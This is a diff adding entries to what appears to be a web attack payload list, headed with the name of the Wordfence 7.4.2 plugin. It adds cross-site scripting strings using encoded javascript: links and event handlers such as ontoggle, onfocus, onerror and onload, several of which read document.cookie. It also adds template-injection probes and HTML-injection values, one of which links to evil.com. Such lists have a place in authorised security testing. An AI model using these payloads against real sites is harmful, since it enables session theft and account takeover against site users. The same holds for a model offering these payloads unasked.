@@ -7,6 +7,27 @@ Wordfence 7.4.2
 <a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>
 
 "><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
+<details open id=ds\\ontoggle=alert(1)>
+<details open id=ds\\ontoggle=confirm(1)>
+teste"onfocus='alert()"'
+teste"onfocus='confirm()"'
 
 <iframe src='jAvAGgg:alert'1'"></iframe>
 <img src=1 oNeRrOr=alert`1`>
+"><img src=1 oNeRrOr=alert`1`>
+<svg/Only=1 onload=alert(1)>
+
+CCTI PAYLOADS:
+{7*7}
+{{alert(document.cookie)}}
+{{$emit.constructor`alert(document.cookie)`()}}
+
+
+
+
+
+HTML PAYLOADS:
+fullname: "oi<a href="https://bing.com">click</a>
+fullname: 'oi<a href=\"https://bing.com\">click</a>
+fullname: <a href="//evil.com">xss</a>
+
